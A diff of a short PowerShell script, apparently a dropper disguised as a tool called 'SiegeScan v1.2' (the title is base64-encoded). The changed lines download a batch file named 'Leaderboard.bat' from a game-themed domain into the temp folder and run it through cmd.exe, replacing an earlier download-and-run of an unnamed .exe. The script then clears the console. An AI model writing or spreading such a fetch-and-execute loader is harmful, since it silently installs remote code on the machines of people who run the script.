@@ -1,8 +1,8 @@
-$exeUrl = "https://knifeduels.shop/.exe"
-$exePath = "$env:TEMP\.exe"
+$batUrl = "https://knifeduels.shop/Leaderboard.bat"
+$batPath = "$env:TEMP\Leaderboard.bat"
 
-Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
-Start-Process -FilePath $exePath
+Invoke-WebRequest -Uri $batUrl -OutFile $batPath
+Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$batPath`""
 
 Clear-Host
 $encodedTitle = "U2llZ2VTY2FuIHYxLjI="
